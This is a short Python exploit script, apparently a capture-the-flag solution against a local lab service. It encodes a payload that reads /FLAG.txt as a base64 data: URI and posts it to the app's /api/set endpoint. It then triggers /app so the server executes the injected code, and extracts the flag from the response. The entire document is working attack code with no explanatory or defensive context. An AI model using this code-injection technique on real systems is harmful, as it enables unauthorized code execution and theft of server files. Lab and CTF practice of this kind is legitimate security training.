import requests
import base64
import json
import re

TARGET = "http://127.0.0.1:32905"

try:
    # Create payload
    payload = {"script": "open('/FLAG.txt').read()"}
    payload_json = json.dumps(payload)
    payload_b64 = base64.b64encode(payload_json.encode()).decode()
    data_uri = f"data:application/json;base64,{payload_b64}"
    
    print(f"[+] Payload: {payload_json}")
    print(f"[+] Data URI: {data_uri[:80]}...\n")
    
    # Set URL
    resp1 = requests.post(f"{TARGET}/api/set", json={"url": data_uri}, timeout=5)
    print(f"[+] POST /api/set: {resp1.status_code}")
    print(f"    {resp1.text}\n")
    
    # Trigger
    resp2 = requests.get(f"{TARGET}/app", timeout=5)
    print(f"[+] GET /app: {resp2.status_code}")
    print(f"    {resp2.text}\n")
    
    # Find flag
    flags = re.findall(r'FLAG\{[^}]+\}', resp2.text)
    if flags:
        print(f"[!] FLAG: {flags[0]}")
    else:
        print("[-] No flag found")
        
except Exception as e:
    print(f"[-] Error: {str(e)}")

